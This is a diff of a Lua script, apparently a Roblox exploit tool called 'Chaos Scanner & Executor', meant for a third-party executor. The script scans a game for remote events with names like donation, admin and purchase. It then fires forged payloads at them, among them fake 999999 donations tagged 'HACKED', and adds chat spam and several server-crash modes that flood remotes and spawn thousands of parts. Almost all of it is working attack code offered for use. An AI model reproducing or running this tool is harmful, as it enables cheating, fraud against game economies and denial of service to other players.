@@ -1,35 +1,23 @@
--- CHAOS SCANNER V1.1 - ULTRA COMPATIBLE
--- Simple version that works on ALL executors
+-- ====================== CHAOS SCANNER & EXECUTOR ======================
+-- ✓ Remote Scanner
+-- ✓ Object Scanner  
+-- ✓ Auto Exploit
+-- ✓ Brutal Crash Modes
+-- =====================================================================================
 
-print("Loading Chaos Scanner...")
+local Player = game.Players.LocalPlayer
+local PlayerGui = Player:WaitForChild("PlayerGui")
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+local CoreGui = game:GetService("CoreGui")
 
--- Basic wait function
-local function safewait(t)
-    local start = tick()
-    repeat until tick() - start >= (t or 0.1)
-end
+print("[CHAOS] Loading...")
 
--- Load services safely
-local Players, RS, WS, CG, UIS, Player, PG
-
-pcall(function()
-    Players = game:FindFirstChildOfClass("Players") or game.Players
-    RS = game:FindFirstChildOfClass("ReplicatedStorage") or game.ReplicatedStorage
-    WS = game:FindFirstChildOfClass("Workspace") or game.Workspace
-    CG = gethui and gethui() or game.CoreGui
-    UIS = game:GetService("UserInputService")
-end)
-
--- Wait for player
-repeat safewait(0.1) until Players and Players.LocalPlayer
-Player = Players.LocalPlayer
-
-repeat safewait(0.1) until Player.Character
-PG = Player:FindFirstChildOfClass("PlayerGui") or Player.PlayerGui
-
-print("[CHAOS] Services loaded!")
-
--- Config
+-- ================= CONFIG =================
 local Config = {
     ScanDelay = 0.1,
     AutoScan = true,
@@ -44,7 +32,7 @@ local Config = {
     }
 }
 
--- Scanner
+-- ================= SCANNER =================
 local Scanner = {
     Results = {RemoteEvents = {}, Objects = {}, GUIs = {}},
     Stats = {TotalScanned = 0, HighRisk = 0, MediumRisk = 0, LowRisk = 0}
@@ -52,6 +40,7 @@ local Scanner = {
 
 function Scanner:ScanRemoteEvents()
     local remotes = {}
+    
     local function scanContainer(container)
         for _, obj in pairs(container:GetDescendants()) do
             if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
@@ -64,43 +53,67 @@ function Scanner:ScanRemoteEvents()
                     Name = obj.Name
                 })
                 self.Stats.TotalScanned = self.Stats.TotalScanned + 1
-                if risk == "High" then self.Stats.HighRisk = self.Stats.HighRisk + 1
-                elseif risk == "Medium" then self.Stats.MediumRisk = self.Stats.MediumRisk + 1
-                else self.Stats.LowRisk = self.Stats.LowRisk + 1 end
+                
+                if risk == "High" then
+                    self.Stats.HighRisk = self.Stats.HighRisk + 1
+                elseif risk == "Medium" then
+                    self.Stats.MediumRisk = self.Stats.MediumRisk + 1
+                else
+                    self.Stats.LowRisk = self.Stats.LowRisk + 1
+                end
             end
         end
     end
-    pcall(function() scanContainer(RS) end)
-    pcall(function() scanContainer(WS) end)
+    
+    pcall(function() scanContainer(ReplicatedStorage) end)
+    pcall(function() scanContainer(Workspace) end)
+    
     self.Results.RemoteEvents = remotes
     return remotes
 end
 
 function Scanner:AnalyzeRemote(remote)
     local name = remote.Name:lower()
+    
     local highRisk = {"donation", "tip", "admin", "mod", "owner", "purchase", "buy", "vip", "gamepass", "money", "cash", "coin"}
     for _, keyword in pairs(highRisk) do
-        if name:find(keyword) then return "High" end
+        if name:find(keyword) then
+            return "High"
+        end
     end
+    
     local mediumRisk = {"chat", "message", "teleport", "tp", "spawn", "give", "award", "unlock"}
     for _, keyword in pairs(mediumRisk) do
-        if name:find(keyword) then return "Medium" end
+        if name:find(keyword) then
+            return "Medium"
+        end
     end
+    
     return "Low"
 end
 
 function Scanner:ScanObjects()
     local objects = {}
-    for _, obj in pairs(WS:GetDescendants()) do
+    
+    for _, obj in pairs(Workspace:GetDescendants()) do
         if obj:IsA("BasePart") and not obj.Anchored then
             local name = obj.Name:lower()
             local risk = "Low"
+            
             if name:find("stair") or name:find("ladder") or name:find("door") or name:find("platform") then
                 risk = "Medium"
             end
-            table.insert(objects, {Object = obj, Name = obj.Name, Type = obj.ClassName, Risk = risk, Movable = true})
+            
+            table.insert(objects, {
+                Object = obj,
+                Name = obj.Name,
+                Type = obj.ClassName,
+                Risk = risk,
+                Movable = true
+            })
         end
     end
+    
     self.Results.Objects = objects
     return objects
 end
@@ -113,7 +126,7 @@ function Scanner:FullScan()
     return self.Results
 end
 
--- Executor
+-- ================= EXECUTOR =================
 local Executor = {Active = {}, Logs = {}}
 
 function Executor:FireRemote(remote, ...)
@@ -133,16 +146,17 @@ function Executor:FakeDonation(remote, amount, message)
         {Amount = amount or 999999, From = Player.Name, Message = message or "HACKED"},
         {value = amount or 999999, player = Player.Name, text = message or "HACKED"}
     }
+    
     for _, data in pairs(variants) do
         self:FireRemote(remote, data)
-        safewait(0.1)
+        wait(0.1)
     end
 end
 
 function Executor:SpamChat(remote, message, count)
     for i = 1, count or 10 do
         self:FireRemote(remote, message or "CHAOS")
-        safewait(0.1)
+        wait(0.1)
     end
 end
 
@@ -162,11 +176,12 @@ function Executor:ChaosMode()
             spawn(function()
                 for i = 1, 5 do
                     self:FireRemote(remote, {chaos = true, value = 999999})
-                    safewait(0.5)
+                    wait(0.5)
                 end
             end)
         end
     end
+    
     for _, obj in pairs(Scanner.Results.Objects) do
         if obj.Movable then
             spawn(function()
@@ -187,10 +202,10 @@ function Executor:MemoryBomb()
                 part.Anchored = false
                 part.Material = Enum.Material.Neon
                 part.BrickColor = BrickColor.Random()
-                part.Parent = WS
+                part.Parent = Workspace
             end)
         end)
-        if i % 100 == 0 then safewait(0.1) end
+        if i % 100 == 0 then wait(0.1) end
     end
 end
 
@@ -204,7 +219,7 @@ function Executor:InfiniteSpam()
                         self:FireRemote(remote, {spam = true, data = string.rep("SPAM", 1000)})
                     end)
                 end
-                safewait(0.001)
+                wait(0.001)
             end
         end)
     end
@@ -212,15 +227,19 @@ end
 
 function Executor:ApocalypseMode()
     print("[APOCALYPSE] Starting...")
+    
     for i = 1, 50 do
         spawn(function()
-            while safewait(0.01) do
+            while wait(0.01) do
                 for _, remote in pairs(Scanner.Results.RemoteEvents) do
-                    pcall(function() self:FireRemote(remote, {apocalypse = true, data = string.rep("X", 10000)}) end)
+                    pcall(function()
+                        self:FireRemote(remote, {apocalypse = true, data = string.rep("X", 10000)})
+                    end)
                 end
             end
         end)
     end
+    
     spawn(function()
         for i = 1, 1000 do
             pcall(function()
@@ -228,44 +247,48 @@ function Executor:ApocalypseMode()
                 part.Size = Vector3.new(50, 50, 50)
                 part.Position = Vector3.new(math.random(-1000, 1000), 500, math.random(-1000, 1000))
                 part.Anchored = false
-                part.Parent = WS
+                part.Parent = Workspace
             end)
-            safewait(0.01)
+            wait(0.01)
         end
     end)
 end
 
--- UI
+-- ================= UI =================
 local UI = {}
 
 function UI:Create()
-    local SG = Instance.new("ScreenGui")
-    SG.Name = "ChaosScanner"
-    SG.ResetOnSpawn = false
-    SG.Parent = CG
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "ChaosScanner"
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    ScreenGui.Parent = CoreGui
     
-    local MF = Instance.new("Frame")
-    MF.Size = UDim2.new(0, 600, 0, 500)
-    MF.Position = UDim2.new(0.5, -300, 0.5, -250)
-    MF.BackgroundColor3 = Config.Theme.Background
-    MF.BorderSizePixel = 0
-    MF.Parent = SG
+    local MainFrame = Instance.new("Frame")
+    MainFrame.Name = "MainFrame"
+    MainFrame.Size = UDim2.new(0, 600, 0, 500)
+    MainFrame.Position = UDim2.new(0.5, -300, 0.5, -250)
+    MainFrame.BackgroundColor3 = Config.Theme.Background
+    MainFrame.BorderSizePixel = 0
+    MainFrame.Parent = ScreenGui
     
-    local Corner = Instance.new("UICorner")
-    Corner.CornerRadius = UDim.new(0, 12)
-    Corner.Parent = MF
+    local UICorner = Instance.new("UICorner")
+    UICorner.CornerRadius = UDim.new(0, 12)
+    UICorner.Parent = MainFrame
     
     local Header = Instance.new("Frame")
+    Header.Name = "Header"
     Header.Size = UDim2.new(1, 0, 0, 60)
     Header.BackgroundColor3 = Config.Theme.Primary
     Header.BorderSizePixel = 0
-    Header.Parent = MF
+    Header.Parent = MainFrame
     
-    local HCorner = Instance.new("UICorner")
-    HCorner.CornerRadius = UDim.new(0, 12)
-    HCorner.Parent = Header
+    local HeaderCorner = Instance.new("UICorner")
+    HeaderCorner.CornerRadius = UDim.new(0, 12)
+    HeaderCorner.Parent = Header
     
     local Title = Instance.new("TextLabel")
+    Title.Name = "Title"
     Title.Size = UDim2.new(0, 200, 1, 0)
     Title.Position = UDim2.new(0, 10, 0, 0)
     Title.BackgroundTransparency = 1
@@ -277,6 +300,7 @@ function UI:Create()
     Title.Parent = Header
     
     local CloseBtn = Instance.new("TextButton")
+    CloseBtn.Name = "CloseBtn"
     CloseBtn.Size = UDim2.new(0, 40, 0, 40)
     CloseBtn.Position = UDim2.new(1, -50, 0.5, -20)
     CloseBtn.BackgroundColor3 = Config.Theme.Danger
@@ -285,43 +309,50 @@ function UI:Create()
     CloseBtn.TextSize = 20
     CloseBtn.Font = Enum.Font.GothamBold
     CloseBtn.Parent = Header
-    CloseBtn.MouseButton1Click:Connect(function() SG:Destroy() end)
     
-    local CCorner = Instance.new("UICorner")
-    CCorner.CornerRadius = UDim.new(0, 8)
-    CCorner.Parent = CloseBtn
+    local CloseBtnCorner = Instance.new("UICorner")
+    CloseBtnCorner.CornerRadius = UDim.new(0, 8)
+    CloseBtnCorner.Parent = CloseBtn
+    
+    CloseBtn.MouseButton1Click:Connect(function()
+        ScreenGui:Destroy()
+    end)
     
     local StatsFrame = Instance.new("Frame")
+    StatsFrame.Name = "StatsFrame"
     StatsFrame.Size = UDim2.new(1, -20, 0, 80)
     StatsFrame.Position = UDim2.new(0, 10, 0, 70)
     StatsFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
     StatsFrame.BorderSizePixel = 0
-    StatsFrame.Parent = MF
+    StatsFrame.Parent = MainFrame
     
-    local SCorner = Instance.new("UICorner")
-    SCorner.CornerRadius = UDim.new(0, 8)
-    SCorner.Parent = StatsFrame
+    local StatsCorner = Instance.new("UICorner")
+    StatsCorner.CornerRadius = UDim.new(0, 8)
+    StatsCorner.Parent = StatsFrame
     
-    local function createStat(name, color, pos)
-        local L = Instance.new("TextLabel")
-        L.Size = UDim2.new(0.25, -10, 1, 0)
-        L.Position = pos
-        L.BackgroundTransparency = 1
-        L.Text = "0"
-        L.TextColor3 = color
-        L.TextSize = 24
-        L.Font = Enum.Font.GothamBold
-        L.Parent = StatsFrame
-        local N = Instance.new("TextLabel")
-        N.Size = UDim2.new(1, 0, 0, 20)
-        N.Position = UDim2.new(0, 0, 1, -25)
-        N.BackgroundTransparency = 1
-        N.Text = name
-        N.TextColor3 = Color3.fromRGB(150, 150, 150)
-        N.TextSize = 12
-        N.Font = Enum.Font.Gotham
-        N.Parent = L
-        return L
+    local function createStat(name, color, position)
+        local StatLabel = Instance.new("TextLabel")
+        StatLabel.Name = name
+        StatLabel.Size = UDim2.new(0.25, -10, 1, 0)
+        StatLabel.Position = position
+        StatLabel.BackgroundTransparency = 1
+        StatLabel.Text = "0"
+        StatLabel.TextColor3 = color
+        StatLabel.TextSize = 24
+        StatLabel.Font = Enum.Font.GothamBold
+        StatLabel.Parent = StatsFrame
+        
+        local StatName = Instance.new("TextLabel")
+        StatName.Size = UDim2.new(1, 0, 0, 20)
+        StatName.Position = UDim2.new(0, 0, 1, -25)
+        StatName.BackgroundTransparency = 1
+        StatName.Text = name
+        StatName.TextColor3 = Color3.fromRGB(150, 150, 150)
+        StatName.TextSize = 12
+        StatName.Font = Enum.Font.Gotham
+        StatName.Parent = StatLabel
+        
+        return StatLabel
     end
     
     local TotalStat = createStat("TOTAL", Config.Theme.Text, UDim2.new(0, 5, 0, 10))
@@ -330,52 +361,61 @@ function UI:Create()
     local LowStat = createStat("LOW", Config.Theme.Success, UDim2.new(0.75, 5, 0, 10))
     
     local ContentFrame = Instance.new("ScrollingFrame")
+    ContentFrame.Name = "ContentFrame"
     ContentFrame.Size = UDim2.new(1, -20, 0, 250)
     ContentFrame.Position = UDim2.new(0, 10, 0, 160)
     ContentFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
     ContentFrame.BorderSizePixel = 0
     ContentFrame.ScrollBarThickness = 6
-    ContentFrame.Parent = MF
+    ContentFrame.Parent = MainFrame
     
-    local CntCorner = Instance.new("UICorner")
-    CntCorner.CornerRadius = UDim.new(0, 8)
-    CntCorner.Parent = ContentFrame
+    local ContentCorner = Instance.new("UICorner")
+    ContentCorner.CornerRadius = UDim.new(0, 8)
+    ContentCorner.Parent = ContentFrame
     
     local ContentList = Instance.new("UIListLayout")
     ContentList.Padding = UDim.new(0, 5)
     ContentList.Parent = ContentFrame
     
-    local function createButton(text, color, pos, callback)
-        local B = Instance.new("TextButton")
-        B.Size = UDim2.new(0.32, -5, 1, 0)
-        B.Position = pos
-        B.BackgroundColor3 = color
-        B.Text = text
-        B.TextColor3 = Config.Theme.Text
-        B.TextSize = 12
-        B.Font = Enum.Font.GothamBold
-        B.Parent = MF
-        local BC = Instance.new("UICorner")
-        BC.CornerRadius = UDim.new(0, 8)
-        BC.Parent = B
-        B.MouseButton1Click:Connect(callback)
-        return B
+    local function createButton(text, color, position, callback)
+        local Button = Instance.new("TextButton")
+        Button.Size = UDim2.new(0.32, -5, 1, 0)
+        Button.Position = position
+        Button.BackgroundColor3 = color
+        Button.Text = text
+        Button.TextColor3 = Config.Theme.Text
+        Button.TextSize = 12
+        Button.Font = Enum.Font.GothamBold
+        Button.Parent = MainFrame
+        
+        local BtnCorner = Instance.new("UICorner")
+        BtnCorner.CornerRadius = UDim.new(0, 8)
+        BtnCorner.Parent = Button
+        
+        Button.MouseButton1Click:Connect(callback)
+        
+        return Button
     end
     
     local ScanBtn = createButton("SCAN", Config.Theme.Primary, UDim2.new(0, 10, 1, -95), function()
         ContentFrame:ClearAllChildren()
         ContentList.Parent = ContentFrame
+        
         Scanner:FullScan()
+        
         TotalStat.Text = tostring(Scanner.Stats.TotalScanned)
         HighStat.Text = tostring(Scanner.Stats.HighRisk)
         MediumStat.Text = tostring(Scanner.Stats.MediumRisk)
         LowStat.Text = tostring(Scanner.Stats.LowRisk)
+        
         UI:DisplayResults(ContentFrame)
     end)
     
     local ExploitBtn = createButton("EXPLOIT", Config.Theme.Warning, UDim2.new(0.34, 10, 1, -95), function()
         for _, remote in pairs(Scanner.Results.RemoteEvents) do
-            if remote.Risk == "High" then Executor:FireRemote(remote, {chaos = true}) end
+            if remote.Risk == "High" then
+                Executor:FireRemote(remote, {chaos = true, value = 999999})
+            end
         end
     end)
     
@@ -395,7 +435,7 @@ function UI:Create()
         Executor:ApocalypseMode()
     end)
     
-    return SG
+    return ScreenGui
 end
 
 function UI:DisplayResults(container)
@@ -406,9 +446,9 @@ function UI:DisplayResults(container)
         Item.BorderSizePixel = 0
         Item.Parent = container
         
-        local IC = Instance.new("UICorner")
-        IC.CornerRadius = UDim.new(0, 6)
-        IC.Parent = Item
+        local ItemCorner = Instance.new("UICorner")
+        ItemCorner.CornerRadius = UDim.new(0, 6)
+        ItemCorner.Parent = Item
         
         local NameLabel = Instance.new("TextLabel")
         NameLabel.Size = UDim2.new(0.6, -15, 0, 20)
@@ -442,9 +482,9 @@ function UI:DisplayResults(container)
         ExecBtn.Font = Enum.Font.GothamBold
         ExecBtn.Parent = Item
         
-        local EC = Instance.new("UICorner")
-        EC.CornerRadius = UDim.new(0, 6)
-        EC.Parent = ExecBtn
+        local ExecCorner = Instance.new("UICorner")
+        ExecCorner.CornerRadius = UDim.new(0, 6)
+        ExecCorner.Parent = ExecBtn
         
         ExecBtn.MouseButton1Click:Connect(function()
             if remote.Name:lower():find("donation") or remote.Name:lower():find("tip") then
@@ -452,27 +492,29 @@ function UI:DisplayResults(container)
             elseif remote.Name:lower():find("chat") then
                 Executor:SpamChat(remote, "CHAOS", 5)
             else
-                Executor:FireRemote(remote, {chaos = true})
+                Executor:FireRemote(remote, {chaos = true, value = 999999})
             end
+            
             ExecBtn.Text = "DONE"
             ExecBtn.BackgroundColor3 = Config.Theme.Success
-            safewait(1)
+            wait(1)
             ExecBtn.Text = "EXEC"
             ExecBtn.BackgroundColor3 = Config.Theme.Primary
         end)
     end
+    
     container.CanvasSize = UDim2.new(0, 0, 0, ContentList.AbsoluteContentSize.Y + 10)
 end
 
--- Init
+-- ================= INIT =================
 print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-print("  CHAOS SCANNER V1.1 - ULTRA COMPATIBLE")
+print("  CHAOS SCANNER V1.1")
 print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
 
 local MainUI = UI:Create()
 
 if Config.AutoScan then
-    safewait(1)
+    wait(1)
     print("[CHAOS] Auto scanning...")
     Scanner:FullScan()
     print("[CHAOS] Found " .. Scanner.Stats.TotalScanned .. " remotes")
